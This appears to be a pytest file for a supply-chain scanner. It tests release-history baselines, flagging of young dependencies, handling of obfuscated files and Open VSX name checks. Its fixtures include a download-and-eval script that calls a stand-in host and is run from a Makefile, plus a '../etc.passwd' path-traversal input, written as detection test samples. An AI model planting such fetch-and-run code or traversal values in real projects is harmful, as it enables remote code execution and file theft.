"""What an established release contained, acquired online and compared offline (`intel/release_history.py`)."""

from __future__ import annotations

import hashlib
import json
from dataclasses import replace
from datetime import UTC, datetime, timedelta

import pytest

from cordon_scanner import Scanner
from cordon_scanner.detect.base import FileUnit
from cordon_scanner.engine.pipeline.history import History
from cordon_scanner.foundation.config.settings import Config
from cordon_scanner.foundation.content import FileContent
from cordon_scanner.foundation.models import Category, Severity
from cordon_scanner.intel.registries.release_history import Baseline, ReleaseHistory

INSTALLER = (
    b'require("https").get("https://releases.example.invalid/x.js", r => r.pipe(process.stdout));\n'
)


class HistoryKit:
    @staticmethod
    def units(installer: bytes = INSTALLER) -> list[FileUnit]:
        manifest = json.dumps({"name": "tool", "version": "2.0.0"}).encode()
        return [
            FileUnit(FileContent(path=p, raw=b, size=len(b)))
            for p, b in {
                "tool-2.0.0.tgz!package/package.json": manifest,
                "tool-2.0.0.tgz!package/install.js": installer,
            }.items()
        ]

    @staticmethod
    def suspicious(tmp_path):
        tmp_path.mkdir(parents=True, exist_ok=True)
        (tmp_path / "fetch.js").write_text(
            'const https = require("https");\n'
            'https.get("https://releases.example.invalid/tool.js", (res) => {\n'
            '  let body = "";\n  res.on("data", (p) => (body += p));\n'
            '  res.on("end", () => eval(body));\n});\n',
            encoding="utf-8",
        )
        # Run by the build, so a repository scan grades it as auto-run code (option A).
        (tmp_path / "Makefile").write_text("all:\n\tnode fetch.js\n", encoding="utf-8")
        found = [
            f
            for f in Scanner(Config.default().with_overrides(use_cache=False))
            .scan(tmp_path)
            .findings
            if f.category is Category.SUSPICIOUS and f.severity > Severity.MEDIUM
        ]
        assert found
        return replace(
            found[0], location=replace(found[0].location, path="tool-2.0.0.tgz!package/install.js")
        )

    @staticmethod
    def store(root, digest: str | None, baseline_version: str | None = "1.4.0") -> None:
        files = {"package/install.js": digest} if digest else {}
        ReleaseHistory.save(
            Baseline(
                "npm", "tool", "2.0.0", baseline_version, "2026-01-02T00:00:00+00:00", files=files
            ),
            root,
        )


class TestKeys:
    def test_the_version_in_a_root_is_written_as_a_placeholder(self) -> None:
        assert (
            ReleaseHistory.key("x-1.2.3.tar.gz!x-1.2.3/x/core.py", "1.2.3")
            == "x-{version}/x/core.py"
        )
        assert (
            ReleaseHistory.key("m.zip!example.com/m@v1.2.3/a.go", "1.2.3")
            == "example.com/m@v{version}/a.go"
        )

    def test_a_longer_version_is_not_split(self) -> None:
        assert ReleaseHistory.key("a!x-1.2.30/f", "1.2.3") == "x-1.2.30/f"

    def test_the_store_round_trips_and_refuses_another_layout(self, tmp_path) -> None:
        HistoryKit.store(tmp_path, "ab")
        loaded = ReleaseHistory.load("npm", "tool", "2.0.0", root=tmp_path)
        assert loaded is not None and loaded.files == {"package/install.js": "ab"}
        entry = next((tmp_path / "npm").iterdir())
        entry.write_text(json.dumps({"store_version": 99}), encoding="utf-8")
        assert ReleaseHistory.load("npm", "tool", "2.0.0", root=tmp_path) is None


class TestTheCeiling:
    def test_a_finding_in_a_file_unchanged_since_an_established_release_is_lowered(
        self, tmp_path
    ) -> None:
        finding = HistoryKit.suspicious(tmp_path / "s")
        HistoryKit.store(tmp_path / "h", hashlib.sha256(INSTALLER).hexdigest())
        [out] = History.established_release_ceiling(
            [finding], HistoryKit.units(), "npm", root=tmp_path / "h"
        )
        assert out.severity is Severity.MEDIUM
        assert "byte-identical in 1.4.0" in out.message

    def test_a_changed_file_keeps_its_grade(self, tmp_path) -> None:
        finding = HistoryKit.suspicious(tmp_path / "s")
        HistoryKit.store(tmp_path / "h", hashlib.sha256(b"older").hexdigest())
        [out] = History.established_release_ceiling(
            [finding], HistoryKit.units(), "npm", root=tmp_path / "h"
        )
        assert out.severity is finding.severity

    def test_nothing_acquired_changes_nothing(self, tmp_path) -> None:
        finding = HistoryKit.suspicious(tmp_path / "s")
        [out] = History.established_release_ceiling(
            [finding], HistoryKit.units(), "npm", root=tmp_path / "h"
        )
        assert out is finding

    def test_no_established_release_changes_nothing(self, tmp_path) -> None:
        finding = HistoryKit.suspicious(tmp_path / "s")
        HistoryKit.store(tmp_path / "h", None, baseline_version=None)
        [out] = History.established_release_ceiling(
            [finding], HistoryKit.units(), "npm", root=tmp_path / "h"
        )
        assert out is finding

    def test_a_malicious_finding_is_never_lowered(self, tmp_path) -> None:
        finding = replace(HistoryKit.suspicious(tmp_path / "s"), category=Category.MALICIOUS)
        HistoryKit.store(tmp_path / "h", hashlib.sha256(INSTALLER).hexdigest())
        [out] = History.established_release_ceiling(
            [finding], HistoryKit.units(), "npm", root=tmp_path / "h"
        )
        assert out.severity is finding.severity


class TestEstablished:
    @staticmethod
    def days(n: int) -> datetime:
        return datetime(2026, 10, 1, tzinfo=UTC) - timedelta(days=n)

    def test_the_newest_release_at_least_ninety_days_older(self, monkeypatch) -> None:
        times = {
            "2.0.0": self.days(0),
            "1.9.0": self.days(30),
            "1.4.0": self.days(120),
            "1.0.0": self.days(400),
        }
        monkeypatch.setattr(ReleaseHistory, "timeline", classmethod(lambda cls, e, n, v: times))
        assert ReleaseHistory.established("npm", "tool", "2.0.0")[0] == "1.4.0"

    def test_a_young_package_has_none(self, monkeypatch) -> None:
        times = {"2.0.0": self.days(0), "1.0.0": self.days(40)}
        monkeypatch.setattr(ReleaseHistory, "timeline", classmethod(lambda cls, e, n, v: times))
        assert ReleaseHistory.established("npm", "tool", "2.0.0") is None

    @pytest.mark.parametrize(
        ("ecosystem", "reader", "document"),
        [
            (
                "npm",
                "registry_client.RegistryClient._fetch",
                {
                    "versions": {"1.0.0": {}, "2.0.0": {}},
                    "time": {
                        "created": "2020-01-01T00:00:00Z",
                        "1.0.0": "2025-01-01T00:00:00Z",
                        "2.0.0": "2026-01-01T00:00:00Z",
                    },
                },
            ),
            (
                "pypi",
                "registry_client.RegistryClient._fetch",
                {
                    "releases": {
                        "1.0.0": [{"upload_time_iso_8601": "2025-01-01T00:00:00Z"}],
                        "2.0.0": [{"upload_time_iso_8601": "2026-01-01T00:00:00Z"}],
                    }
                },
            ),
            (
                "cargo",
                "more_registries.RegistryHttp.json",
                {
                    "versions": [
                        {"num": "1.0.0", "created_at": "2025-01-01T00:00:00Z"},
                        {"num": "2.0.0", "created_at": "2026-01-01T00:00:00Z"},
                    ]
                },
            ),
        ],
    )
    def test_registry_times_are_read(self, monkeypatch, ecosystem, reader, document) -> None:
        module, _, attribute = reader.rpartition(".")
        owner_module, _, owner = module.rpartition(".")
        import importlib

        target = getattr(
            importlib.import_module(f"cordon_scanner.intel.registries.{owner_module}"), owner
        )
        monkeypatch.setattr(target, attribute, staticmethod(lambda *a, **k: document))
        times = ReleaseHistory.timeline(ecosystem, "tool", "2.0.0")
        assert sorted(times) == ["1.0.0", "2.0.0"]
        assert ReleaseHistory.established(ecosystem, "tool", "2.0.0")[0] == "1.0.0"


class TestAcquireIsOnlineOnly:
    def test_refused_offline(self, tmp_path, monkeypatch) -> None:
        import argparse

        from cordon_scanner.cli.commands.intel import IntelCommand
        from cordon_scanner.foundation.errors import ConfigError

        monkeypatch.setenv("CORDON_OFFLINE", "1")
        with pytest.raises(ConfigError):
            IntelCommand.acquire(argparse.Namespace(targets=[str(tmp_path / "x.tgz")], json=False))


class TestANewYoungDependency:
    """`History.young_dependency_introduced`."""

    @staticmethod
    def units(dependencies: dict[str, str], name: str = "tool") -> list[FileUnit]:
        manifest = json.dumps({"name": name, "version": "2.0.0", "dependencies": dependencies})
        return [
            FileUnit(
                FileContent(
                    path="tool-2.0.0.tgz!package/package.json",
                    raw=manifest.encode(),
                    size=len(manifest),
                )
            )
        ]

    @staticmethod
    def store(root, introduced: dict[str, str], name: str = "tool") -> None:
        ReleaseHistory.save(
            Baseline(
                "npm",
                name,
                "2.0.0",
                "1.4.0",
                "2026-01-02T00:00:00+00:00",
                published="2026-06-17T00:00:00+00:00",
                dependencies=("left-pad",),
                introduced=introduced,
            ),
            root,
        )

    @staticmethod
    def found(units, root) -> list[str]:
        from types import SimpleNamespace

        from cordon_scanner.foundation.scoring import RiskScorer

        ctx = SimpleNamespace(scorer=RiskScorer())
        return [
            f.rule_id for f in History.young_dependency_introduced(units, "npm", ctx, root=root)
        ]

    def test_a_dependency_created_days_before_the_release_is_reported(self, tmp_path) -> None:
        self.store(tmp_path, {"easy-time-js": "2026-06-10T00:00:00+00:00"})
        units = self.units({"left-pad": "1", "easy-time-js": "^1"})
        assert self.found(units, tmp_path) == ["SUSPECT.RELEASE.NEW_YOUNG_DEPENDENCY.001"]

    def test_an_old_dependency_newly_added_is_not(self, tmp_path) -> None:
        self.store(tmp_path, {"chalk": "2014-01-01T00:00:00+00:00"})
        assert self.found(self.units({"chalk": "^5"}), tmp_path) == []

    def test_the_packages_own_scope_is_its_maintainers(self, tmp_path) -> None:
        self.store(tmp_path, {"@acme/new-sibling": "2026-06-15T00:00:00+00:00"}, name="@acme/tool")
        units = self.units({"@acme/new-sibling": "1"}, name="@acme/tool")
        assert self.found(units, tmp_path) == []

    def test_nothing_acquired_reports_nothing(self, tmp_path) -> None:
        assert self.found(self.units({"easy-time-js": "^1"}), tmp_path) == []

    def test_declared_dependencies_are_read_per_format(self) -> None:
        npm = self.units({"a": "1"})
        assert ReleaseHistory.declared_dependencies(npm, "npm") == {"a"}
        metadata = b"Name: x\nVersion: 1\nRequires-Dist: Foo_Bar>=1\nRequires-Dist: pytest; extra == 'test'\n"
        pypi = [
            FileUnit(FileContent(path="x-1.tar.gz!x-1/PKG-INFO", raw=metadata, size=len(metadata)))
        ]
        assert ReleaseHistory.declared_dependencies(pypi, "pypi") == {"foo-bar"}


class TestObfuscatedSinceAnEstablishedRelease:
    """Obfuscated output differs on every build; the established release shows it was already
    obfuscated months ago. A new package, or a file turned obfuscated now, keeps its grade."""

    PACKED = b"".join(b"var _0x%04x = %d;\n" % (n, n) for n in range(12))

    @staticmethod
    def finding(tmp_path, path: str = "tool-2.0.0.tgz!package/lib.js"):
        base = HistoryKit.suspicious(tmp_path / "s")
        return replace(
            base,
            rule_id="SUSPECT.OBFUSCATION.PACKED.001",
            location=replace(base.location, path=path),
        )

    @classmethod
    def units(cls) -> list[FileUnit]:
        return [
            *HistoryKit.units(),
            FileUnit(FileContent(path="tool-2.0.0.tgz!package/lib.js", raw=cls.PACKED, size=12)),
        ]

    @staticmethod
    def store(root, obfuscated: tuple[str, ...]) -> None:
        ReleaseHistory.save(
            Baseline(
                "npm",
                "tool",
                "2.0.0",
                "1.4.0",
                "2026-01-02T00:00:00+00:00",
                obfuscated=obfuscated,
            ),
            root,
        )

    def test_a_file_obfuscated_in_the_established_release_is_lowered(self, tmp_path) -> None:
        self.store(tmp_path / "h", ("package/lib.js",))
        [out] = History.established_release_ceiling(
            [self.finding(tmp_path)], self.units(), "npm", root=tmp_path / "h"
        )
        assert out.severity is Severity.MEDIUM
        assert "already obfuscated in 1.4.0" in out.message

    def test_a_file_newly_obfuscated_keeps_its_grade(self, tmp_path) -> None:
        self.store(tmp_path / "h", ())
        finding = self.finding(tmp_path)
        [out] = History.established_release_ceiling(
            [finding], self.units(), "npm", root=tmp_path / "h"
        )
        assert out.severity is finding.severity

    def test_a_file_an_install_hook_runs_keeps_its_grade(self, tmp_path) -> None:
        self.store(tmp_path / "h", ("package/lib.js",))
        finding = self.finding(tmp_path)
        [out] = History.established_release_ceiling(
            [finding],
            self.units(),
            "npm",
            root=tmp_path / "h",
            hook_paths=frozenset({"tool-2.0.0.tgz!package/lib.js"}),
        )
        assert out.severity is finding.severity

    def test_the_obfuscated_files_of_a_release_are_recorded(self) -> None:
        import io
        import tarfile

        buffer = io.BytesIO()
        with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
            for member, data in {
                "package/lib.js": self.PACKED,
                "package/index.js": b"module.exports = 1;\n",
            }.items():
                info = tarfile.TarInfo(member)
                info.size = len(data)
                archive.addfile(info, io.BytesIO(data))
        from cordon_scanner.cli.commands.intel import IntelCommand

        assert ReleaseHistory.obfuscated(
            buffer.getvalue(), "tool-1.4.0.tgz", "1.4.0", members=IntelCommand.members
        ) == ("package/lib.js",)


class TestOpenVsx:
    """An editor extension against its own established release on Open VSX (no network here)."""

    @staticmethod
    def vsix_units(publisher: str = "Acme", name: str = "tool", version: str = "1.2.0"):
        manifest = json.dumps({"publisher": publisher, "name": name, "version": version}).encode()
        return [
            FileUnit(FileContent(path=f"x.vsix!{p}", raw=b, size=len(b)))
            for p, b in {
                "extension.vsixmanifest": b"<PackageManifest/>",
                "extension/package.json": manifest,
                "extension/out/extension.js": b"module.exports = {};\n",
            }.items()
        ]

    def test_a_vsix_is_known_to_release_history_by_its_publisher_and_name(self) -> None:
        units = self.vsix_units()
        assert History.history_distribution(units) == "openvsx"
        # As published: the API redirects any other spelling to this one.
        assert History.history_identity(units, "openvsx") == ("openvsx", "Acme.tool", "1.2.0")

    def test_a_name_that_is_not_publisher_dot_extension_is_refused(self) -> None:
        from cordon_scanner.intel.registries.openvsx import OpenVsx
        from cordon_scanner.intel.registries.registry_client import RegistryError

        assert OpenVsx.split("Acme.tool") == ("Acme", "tool")
        with pytest.raises(RegistryError):
            OpenVsx.split("../etc.passwd")

    def test_file_links_map_to_the_file_host_with_the_publishers_spelling(self) -> None:
        from cordon_scanner.intel.registries.openvsx import OpenVsx
        from cordon_scanner.intel.registries.registry_client import RegistryError

        link = "https://open-vsx.org/api/BroadcomMFD/jcl/3.0.3/file/BroadcomMFD.jcl-3.0.3.vsix"
        assert OpenVsx._on_file_host(link) == (
            "https://openvsx.eclipsecontent.org/BroadcomMFD/jcl/3.0.3/BroadcomMFD.jcl-3.0.3.vsix"
        )
        with pytest.raises(RegistryError):
            OpenVsx._on_file_host("https://elsewhere.example/api/x/y/1/file/z.vsix")
